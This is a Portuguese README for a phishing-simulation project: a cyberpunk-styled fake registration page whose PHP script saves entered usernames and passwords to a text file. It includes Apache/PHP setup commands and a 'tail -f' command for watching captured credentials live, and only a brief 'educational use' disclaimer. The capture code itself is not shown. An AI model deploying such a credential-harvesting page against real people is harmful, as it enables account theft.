🚀 Projeto de Simulação de Phishing Futurista
🛠️ Tecnologias Utilizadas
<div align="center">

</div>
Este projeto simula uma página de login com um estilo futurista e interativo, onde utilizamos uma combinação de tecnologias para proporcionar uma experiência cyberpunk/hacker. Com animações, interatividade e um efeito especial ao clicar no botão de registrar, o projeto captura as credenciais do usuário de maneira intuitiva.

📋 Estrutura do Projeto
A estrutura do projeto é simples, mas eficiente, permitindo a captura de dados e um layout visual impactante.

bash
Copiar código
phishing-simulation/
│
├── index.html            # Página principal com o formulário de registro e interações
├── capture.php           # Script PHP que captura os dados do formulário
├── styles.css            # Folha de estilos que define o visual futurista da página
└── creds.txt             # Arquivo onde os dados dos usuários são armazenados
🌐 Como Funciona?
O usuário acessa a página e insere as informações de nome de usuário, senha e confirmação de senha.
Ao clicar no botão "Registrar", o botão explode com um efeito visual e uma mensagem de sucesso é exibida.
As credenciais são enviadas ao servidor onde são capturadas pelo script PHP.
O administrador pode monitorar as credenciais capturadas em tempo real no terminal.
🎨 Estilo Visual e Temática
A página foi desenvolvida com uma estética hacker/cyberpunk, utilizando:

Cores: Preto, verde neon e vermelho, dando um toque de "terminal".
Fontes: Estilo de terminal (Courier New) para intensificar o visual hacker.
Animações: Efeitos de hover nos botões e explosão visual ao clicar em "Registrar".
🧭 Como Rodar o Projeto Localmente
Siga os passos abaixo para configurar o projeto em sua máquina:

Pré-requisitos
Servidor Apache2
PHP 7.x ou superior
Sistema operacional baseado em Linux
Passo a Passo
Instalar o Apache2:

bash
Copiar código
sudo apt-get install apache2
Iniciar o servidor Apache:

bash
Copiar código
sudo systemctl start apache2
sudo systemctl enable apache2
Instalar PHP:

bash
Copiar código
sudo apt-get install php
Clonar o repositório:

bash
Copiar código
git clone https://github.com/seu-repositorio/phishing-simulation.git
Copiar os arquivos para o diretório do Apache:

bash
Copiar código
sudo cp index.html capture.php styles.css /var/www/html/phishing-simulation/
Iniciar o servidor PHP na porta 8000:

bash
Copiar código
php -S 0.0.0.0:8000
Acessar o projeto no navegador:

arduino
Copiar código
http://10.0.3.15:8000
📡 Monitoramento em Tempo Real
Para monitorar as credenciais capturadas em tempo real, use o comando abaixo:

bash
Copiar código
sudo tail -f /var/www/html/phishing-simulation/creds.txt
Isso permitirá que você veja todas as inserções de dados dos usuários conforme elas acontecem.

📜 Licença
Este projeto é de livre uso para fins educacionais e não deve ser utilizado para atividades maliciosas.

